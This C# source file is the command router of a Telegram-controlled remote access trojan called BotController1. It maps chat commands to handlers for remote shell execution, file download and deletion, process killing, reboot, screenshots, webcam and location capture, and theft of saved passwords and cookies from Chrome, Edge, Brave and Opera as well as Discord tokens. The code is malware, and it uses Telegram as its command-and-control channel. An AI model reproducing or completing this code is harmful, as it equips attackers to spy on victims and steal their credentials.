using System.Text.Json;
using BotController1.Handlers;

namespace BotController1.Telegram;

public class Router
{
    private readonly TelegramClient _tg;
    private readonly Dictionary<string, Action<TgMessage>> _commands = new();

    public Router(TelegramClient tg)
    {
        _tg = tg;
        Register();
    }

    private void Register()
    {
        var system = new SystemHandlers(_tg);
        var media = new MediaHandlers(_tg);
        var shell = new ShellHandlers(_tg);
        var steal = new StealHandlers(_tg);

        _commands["start"] = system.Welcome;
        _commands["help"] = system.Welcome;
        _commands["status"] = system.Status;
        _commands["info"] = system.Info;
        _commands["location"] = system.Location;

        _commands["screenshot"] = media.Screenshot;
        _commands["screen"] = media.Screen;
        _commands["webcam"] = media.Webcam;
        _commands["webcam3"] = media.Webcam3;
        _commands["grabpic"] = media.GrabPic;
        _commands["grabvideos"] = media.GrabVideos;
        _commands["stop"] = media.Stop;

        _commands["pwd"] = shell.Pwd;
        _commands["cmd"] = shell.Cmd;
        _commands["open_url"] = shell.OpenUrl;
        _commands["ls"] = shell.Ls;
        _commands["cd"] = shell.Cd;
        _commands["download"] = shell.Download;
        _commands["rm_dir"] = shell.RmDir;
        _commands["kill_process"] = shell.KillProcess;
        _commands["reboot"] = shell.Reboot;
        _commands["shutdown"] = shell.Shutdown;

        foreach (var browser in new[] { "chrome", "edge", "brave", "opera" })
        {
            _commands[$"passwords_{browser}"] = steal.Passwords;
            _commands[$"passwords{browser}"] = steal.Passwords;
            _commands[$"cookies_{browser}"] = steal.Cookies;
            _commands[$"cookies{browser}"] = steal.Cookies;
        }
        _commands["get_discord"] = steal.Discord;
        _commands["getdiscord"] = steal.Discord;
    }

    public void Run()
    {
        long offset = 0;
        while (true)
        {
            var updates = _tg.GetUpdates(offset);
            foreach (var update in updates.EnumerateArray())
            {
                offset = update.GetProperty("update_id").GetInt64() + 1;
                if (!update.TryGetProperty("message", out var msg))
                    continue;
                if (!msg.TryGetProperty("text", out var textEl))
                    continue;
                var text = textEl.GetString();
                if (string.IsNullOrEmpty(text))
                    continue;
                Dispatch(text, msg);
            }
        }
    }

    private void Dispatch(string text, JsonElement msg)
    {
        var words = text.Split((char[])null, StringSplitOptions.RemoveEmptyEntries);
        if (words.Length == 0)
            return;
        var token = words[0];
        if (token.Length == 0 || token[0] != '/')
            return;
        var command = token.Substring(1);
        var atIndex = command.IndexOf('@');
        if (atIndex >= 0)
            command = command.Substring(0, atIndex);
        if (!_commands.TryGetValue(command, out var handler))
            return;

        var message = new TgMessage
        {
            ChatId = msg.GetProperty("chat").GetProperty("id").GetInt64(),
            MessageId = msg.GetProperty("message_id").GetInt32(),
            Text = text,
        };

        try
        {
            handler(message);
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error handling /{command}: {e}");
        }
    }
}
